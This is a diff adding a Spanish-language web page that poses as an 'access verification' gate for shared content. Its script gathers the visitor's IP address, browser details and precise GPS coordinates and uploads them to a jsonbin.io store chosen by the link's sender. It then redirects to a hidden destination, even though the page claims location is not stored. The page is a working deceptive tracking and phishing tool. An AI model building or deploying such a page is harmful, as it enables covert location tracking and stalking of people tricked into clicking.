@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Acceso al contenido</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{
+      --bg:#06080f;--surf:#0d1117;--border:#1a2033;
+      --blue:#4a90e2;--indigo:#6c63ff;--green:#22d3a5;
+      --red:#f07171;--text:#dde4f0;--muted:#5a6480;
+      --r:14px;
+    }
+    body{
+      font-family:'DM Sans',sans-serif;
+      background:var(--bg);color:var(--text);
+      min-height:100vh;display:flex;align-items:center;justify-content:center;
+      padding:20px;
+    }
+    body::before{
+      content:'';position:fixed;inset:0;
+      background:
+        radial-gradient(ellipse 55% 45% at 15% 15%,rgba(74,144,226,.07) 0%,transparent 65%),
+        radial-gradient(ellipse 45% 55% at 85% 85%,rgba(108,99,255,.06) 0%,transparent 65%);
+      pointer-events:none;z-index:0;
+    }
+    .card{
+      position:relative;z-index:1;
+      background:var(--surf);border:1px solid var(--border);
+      border-radius:20px;padding:36px 32px;
+      max-width:420px;width:100%;
+      box-shadow:0 24px 64px rgba(0,0,0,.55),0 0 0 1px rgba(255,255,255,.03) inset;
+      animation:up .55s cubic-bezier(.16,1,.3,1) both;
+    }
+    @keyframes up{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
+
+    .chip{
+      display:inline-flex;align-items:center;gap:6px;
+      font-family:'DM Mono',monospace;font-size:9.5px;letter-spacing:.12em;
+      text-transform:uppercase;color:var(--blue);
+      background:rgba(74,144,226,.09);border:1px solid rgba(74,144,226,.2);
+      border-radius:100px;padding:4px 11px;margin-bottom:24px;
+    }
+    .chip .dot{width:5px;height:5px;background:var(--blue);border-radius:50%;animation:blink 2s infinite}
+    @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+    .icon{
+      width:58px;height:58px;border-radius:16px;
+      background:linear-gradient(135deg,rgba(74,144,226,.12),rgba(108,99,255,.12));
+      border:1px solid rgba(74,144,226,.18);
+      display:flex;align-items:center;justify-content:center;
+      font-size:26px;margin-bottom:20px;
+    }
+    h1{font-size:21px;font-weight:600;line-height:1.3;margin-bottom:10px;
+       background:linear-gradient(135deg,#dde4f0,#8a95b8);
+       -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+    p.desc{font-size:13.5px;color:var(--muted);line-height:1.7;margin-bottom:24px}
+
+    .rows{background:rgba(255,255,255,.025);border:1px solid var(--border);
+          border-radius:12px;padding:14px;margin-bottom:24px;display:flex;flex-direction:column;gap:11px}
+    .row{display:flex;align-items:flex-start;gap:10px;font-size:12.5px;color:var(--muted)}
+    .row em{font-style:normal;font-size:15px}
+    .row span strong{color:var(--text);font-weight:500;display:block;margin-bottom:1px}
+
+    .btn{width:100%;padding:13px;border-radius:11px;border:none;
+         font-family:'DM Sans',sans-serif;font-size:14.5px;font-weight:600;
+         cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:7px}
+    .btn-main{background:linear-gradient(135deg,var(--blue),var(--indigo));color:#fff;
+              box-shadow:0 8px 22px rgba(74,144,226,.28)}
+    .btn-main:hover{transform:translateY(-1px);box-shadow:0 12px 30px rgba(74,144,226,.38)}
+    .btn-main:disabled{opacity:.45;cursor:not-allowed;transform:none}
+    .btn-skip{background:transparent;color:var(--muted);border:1px solid var(--border);
+              margin-top:9px;font-size:12.5px}
+    .btn-skip:hover{color:var(--red);border-color:var(--red);background:rgba(240,113,113,.05)}
+
+    .st{margin-top:16px;padding:12px 14px;border-radius:10px;font-size:12.5px;
+        display:none;gap:9px;align-items:center;line-height:1.5}
+    .st.show{display:flex}
+    .st.info{background:rgba(74,144,226,.07);border:1px solid rgba(74,144,226,.18);color:var(--blue)}
+    .st.ok{background:rgba(34,211,165,.07);border:1px solid rgba(34,211,165,.18);color:var(--green)}
+    .st.err{background:rgba(240,113,113,.07);border:1px solid rgba(240,113,113,.18);color:var(--red)}
+    .spin{width:14px;height:14px;border:2px solid rgba(255,255,255,.15);border-top-color:currentColor;
+          border-radius:50%;animation:spin .65s linear infinite;flex-shrink:0}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .note{margin-top:18px;font-size:11px;color:var(--muted);text-align:center;line-height:1.6;opacity:.65}
+
+    /* success */
+    #successView{display:none;text-align:center}
+    .big{font-size:50px;margin-bottom:14px;animation:pop .4s cubic-bezier(.34,1.56,.64,1) both}
+    @keyframes pop{from{opacity:0;transform:scale(.3)}to{opacity:1;transform:scale(1)}}
+    #successView h2{font-size:19px;margin-bottom:8px}
+    #successView p{font-size:13px;color:var(--muted)}
+  </style>
+</head>
+<body>
+<div class="card" id="card">
+
+  <div id="mainView">
+    <div class="chip"><span class="dot"></span>Verificación de acceso</div>
+    <div class="icon">📍</div>
+    <h1>Se requiere verificación</h1>
+    <p class="desc">Para acceder al contenido compartido contigo, necesitamos confirmar tu ubicación por razones de seguridad.</p>
+
+    <div class="rows">
+      <div class="row"><em>🔒</em><span><strong>Privacidad garantizada</strong>Solo se usa para verificar este acceso</span></div>
+      <div class="row"><em>📡</em><span><strong>Se recopila:</strong> ubicación GPS y dirección IP</span></div>
+      <div class="row"><em>⚡</em><span><strong>Uso único</strong> — no se almacena tu posición</span></div>
+    </div>
+
+    <button class="btn btn-main" id="btnAllow" onclick="iniciar()">📍 Permitir y acceder al contenido</button>
+    <button class="btn btn-skip" onclick="denegar()">No permitir acceso</button>
+
+    <div class="st info" id="stLoad"><div class="spin"></div><span id="stTxt">Iniciando…</span></div>
+    <div class="st ok"   id="stOk">✅ <span id="stOkTxt">Verificado. Redirigiendo…</span></div>
+    <div class="st err"  id="stErr">⚠️ <span id="stErrTxt">Error al obtener ubicación.</span></div>
+
+    <p class="note">Al continuar aceptas que tu ubicación sea verificada.<br>Datos tratados conforme a nuestra política de privacidad.</p>
+  </div>
+
+  <div id="successView">
+    <div class="big">✅</div>
+    <h2>Acceso concedido</h2>
+    <p>Verificación completada.<br>Serás redirigido en un momento…</p>
+  </div>
+</div>
+
+<script>
+// ─── CONFIGURACIÓN ──────────────────────────────────────────────
+// Pega aquí tu BIN ID de jsonbin.io (lo obtienes en admin.html)
+// NO toques nada más
+const JSONBIN_KEY = "$2a$10$REEMPLAZA_CON_TU_API_KEY";  // <-- API key de jsonbin.io
+// ────────────────────────────────────────────────────────────────
+
+const params  = new URLSearchParams(location.search);
+const SESSION = params.get("sid") || "unknown";
+const BIN_ID  = params.get("bin") || "";
+const DEST    = params.get("dest") ? atob(params.get("dest")) : "#";
+
+function show(id){ document.getElementById(id).classList.add("show") }
+function hide(id){ document.getElementById(id).classList.remove("show") }
+function txt(id,t){ document.getElementById(id).textContent=t }
+
+async function getIP(){
+  try{const r=await fetch("https://api.ipify.org?format=json");const d=await r.json();return d.ip}
+  catch{return "N/A"}
+}
+
+async function pushVisit(data){
+  if(!BIN_ID)return;
+  try{
+    // Leer bin actual
+    const r1=await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`,{
+      headers:{"X-Master-Key":JSONBIN_KEY}
+    });
+    const d1=await r1.json();
+    const visits=(d1.record?.visits)||[];
+    visits.push(data);
+    // Actualizar bin
+    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`,{
+      method:"PUT",
+      headers:{"Content-Type":"application/json","X-Master-Key":JSONBIN_KEY},
+      body:JSON.stringify({visits})
+    });
+  }catch(e){console.warn("pushVisit error",e)}
+}
+
+async function iniciar(){
+  document.getElementById("btnAllow").disabled=true;
+  hide("stErr"); show("stLoad"); txt("stTxt","Obteniendo IP…");
+
+  const ip=await getIP();
+  txt("stTxt","Solicitando permiso de ubicación GPS…");
+
+  const base={
+    sesion:SESSION, fecha:new Date().toISOString(),
+    ip, agente:navigator.userAgent,
+    pantalla:`${screen.width}x${screen.height}`,
+    idioma:navigator.language
+  };
+
+  if(!navigator.geolocation){
+    await finalizar({...base,gps:null,motivo:"Sin soporte GPS"});
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async(pos)=>{
+      const{latitude:lat,longitude:lng,accuracy:acc}=pos.coords;
+      txt("stTxt","Enviando datos…");
+      await finalizar({
+        ...base,
+        gps:{lat,lng,precision:Math.round(acc),
+             mapa:`https://maps.google.com/?q=${lat},${lng}`}
+      });
+    },
+    async(err)=>{
+      await finalizar({...base,gps:null,motivo:err.message});
+    },
+    {enableHighAccuracy:true,timeout:12000,maximumAge:0}
+  );
+}
+
+async function finalizar(data){
+  await pushVisit(data);
+  hide("stLoad"); show("stOk");
+  setTimeout(()=>{
+    document.getElementById("mainView").style.display="none";
+    document.getElementById("successView").style.display="block";
+  },1200);
+  setTimeout(()=>{location.href=DEST},3000);
+}
+
+function denegar(){
+  hide("stLoad");
+  document.getElementById("stErr").classList.add("show");
+  txt("stErrTxt","Debes permitir el acceso para continuar.");
+  document.getElementById("btnAllow").disabled=false;
+}
+</script>
+</body>
+</html>
